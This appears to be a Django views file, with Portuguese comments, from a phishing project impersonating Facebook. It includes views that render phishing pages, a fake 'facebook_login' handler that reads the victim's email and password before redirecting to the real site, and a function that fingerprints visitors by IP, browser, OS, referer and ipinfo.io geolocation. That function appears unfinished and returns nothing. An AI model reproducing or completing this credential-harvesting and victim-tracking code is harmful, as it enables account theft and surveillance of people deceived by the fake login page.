from django.shortcuts import redirect, render
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse
from django.http import JsonResponse
from user_agents import parse
import requests


def home_view(request):
    return render(request, 'home.html')

def exemplo_view(request):
    context = {
        'titulo': 'Este é um Título de Exemplo',
        'mensagem': 'Esta é uma mensagem de exemplo que está sendo passada do contexto do template.'
    }
    return render(request, 'exemplo.html', context)

def contato_view(request):
    return render(request, 'contato.html')

def phising_view(request):
    return render(request, 'phising_home.html')

def phising_facebook_view(request):
    return render(request, 'phising_facebook.html')

def facebook_login(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('pass')

        # Aqui você pode adicionar lógica para processar os dados do formulário
        # Exemplo: autenticar o usuário no Django (se estiver usando autenticação)

        # Exemplo simples: redirecionar diretamente para o Facebook
        return redirect('https://www.facebook.com/')
    else:
        # Lógica para renderizar o formulário de login (se necessário)
        return render(request, 'login_form.html')
    
def capturar_info_usuario(request):
    # Captura informações básicas do usuário
    ip_address = request.META.get('REMOTE_ADDR')
    user_agent_str = request.META.get('HTTP_USER_AGENT')
    referer = request.META.get('HTTP_REFERER')

    # Analisa o agente do usuário para obter informações detalhadas
    user_agent = parse(user_agent_str)
    browser = user_agent.browser.family
    browser_version = user_agent.browser.version_string
    os = user_agent.os.family
    os_version = user_agent.os.version_string

    # Faz uma requisição para obter informações de geolocalização baseadas no IP
    ipinfo_url = f'http://ipinfo.io/{ip_address}/json'
    response = requests.get(ipinfo_url)
    if response.status_code == 200:
        data = response.json()
        country = data.get('country', '')
        city = data.get('city', '')
        hostname = data.get('hostname', '')
        isp = data.get('org', '')
    else:
        country = city = hostname = isp = 'Informações não disponíveis'

    # Constrói um dicionário com todas as informações coletadas
    info_usuario = {
        'data_hora': request.META.get('REQUEST_TIME'),
        'ip_address': ip_address,
        'country': f"{country}, {city}",
        'browser': f"{browser} ({browser_version})",
        'os': f"{os} {os_version}",
        'user_agent': user_agent_str,
        'referer': referer,
        'hostname': hostname,
        'isp': isp,
    }


"""
def charts(request):
    # Dados de exemplo
    data = {
        'labels': ['A', 'B', 'C', 'D'],
        'datasets': [{
            'label': 'Exemplo',
            'data': [12, 19, 3, 5],
        }]
    }

    chart = BarChart(data)
    return JsonResponse(chart.to_dict())
"""
